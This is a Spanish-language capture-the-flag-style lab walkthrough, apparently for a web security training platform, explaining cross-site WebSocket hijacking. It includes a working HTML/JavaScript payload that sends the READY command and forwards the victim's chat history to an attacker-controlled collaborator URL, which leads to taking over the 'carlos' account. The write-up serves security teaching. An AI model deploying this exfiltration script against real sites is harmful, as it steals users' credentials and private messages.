# 2. WS Cross-site (CSWSH)

## 📨 Cross-site WebSocket hijacking (CSWSH)

### 📄 Descripción del laboratorio

La aplicación implementa un **chat en vivo mediante WebSockets**, pero no protege las conexiones **cross-site**.

El servidor:

* No valida la cabecera **Origin**.
* No utiliza **tokens anti-CSRF** durante el handshake.
* Acepta conexiones WebSocket desde **cualquier dominio**.

El objetivo es:

* Establecer una **conexión WebSocket desde un dominio externo**.
* Robar el **historial de chat de la víctima**.
* Obtener credenciales y autenticarse como **carlos**.

***

### 📚 Teoría

**Cross-site WebSocket hijacking (CSWSH)** es una variante de **CSRF** aplicada específicamente a WebSockets.

Ocurre cuando se cumplen las siguientes condiciones:

* El servidor acepta conexiones WebSocket sin validar **Origin**.
* El navegador de la víctima tiene una **sesión autenticada**.
* El atacante controla una **página en un dominio externo**.
* El navegador puede abrir automáticamente una **conexión WebSocket**.

#### 📌 Funcionamiento del ataque

Cuando la víctima carga la página del atacante:

1. El navegador establece una conexión `wss://` hacia el servidor vulnerable.
2. Las **cookies de sesión se envían automáticamente**.
3. El servidor considera la conexión **legítima**.
4. El atacante puede:
   * Enviar **comandos WebSocket**.
   * Recibir **respuestas del servidor**.
   * **Exfiltrar información sensible**.

En este laboratorio ocurre además que:

* El comando **READY** solicita el **historial completo del chat**.
* Ese historial contiene **credenciales en texto claro**.

Esto demuestra que los **WebSockets requieren las mismas protecciones de origen y CSRF que HTTP**.

***

### 📝 Práctica

#### 🎯 Objetivo

Robar las credenciales del usuario **carlos** desde su historial de chat.

***

#### 1️⃣ Identificación del comando sensible

Abrimos la funcionalidad **live chat** de la aplicación.

Enviamos un mensaje cualquiera y recargamos la página.

En **Burp Suite → WebSockets history** observamos que, al cargarse el chat, el cliente envía el siguiente comando:

```
READY
```

El servidor responde devolviendo **todo el historial del chat**.

Conclusión: el comando `READY` permite recuperar el historial completo.

***

#### 2️⃣ Construcción del payload malicioso

Creamos un payload HTML/JavaScript que:

1. Establece una conexión WebSocket con el servidor vulnerable.
2. Envía el comando `READY` cuando la conexión se abre.
3. Reenvía cada mensaje recibido a un endpoint controlado por el atacante.

Payload base:

```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

***

#### 3️⃣ Adaptación al laboratorio

Se modifica el script con:

La URL real del WebSocket:

```
wss://ID-DEL-LAB.web-security-academy.net/chat
```

Y la URL de **Burp Collaborator** o del **Exploit Server** para recibir los datos exfiltrados.

***

#### 4️⃣ Ejecución del ataque

Pegamos el payload en el **Exploit Server** y ejecutamos:

* **Store**
* **Deliver exploit to victim**

Cuando la víctima (carlos) carga la página maliciosa:

1. Se establece una conexión WebSocket autenticada.
2. El navegador envía automáticamente sus **cookies de sesión**.
3. El script envía el comando `READY`.
4. El servidor devuelve el **historial completo del chat**.
5. Los mensajes se **exfiltran al servidor del atacante**.

***

#### 5️⃣ Resultado final

En **Burp Collaborator** o en los logs del **Exploit Server** aparecen los mensajes del historial del chat.

Entre ellos se encuentran las **credenciales de carlos**.

Utilizamos esas credenciales para iniciar sesión como dicho usuario.
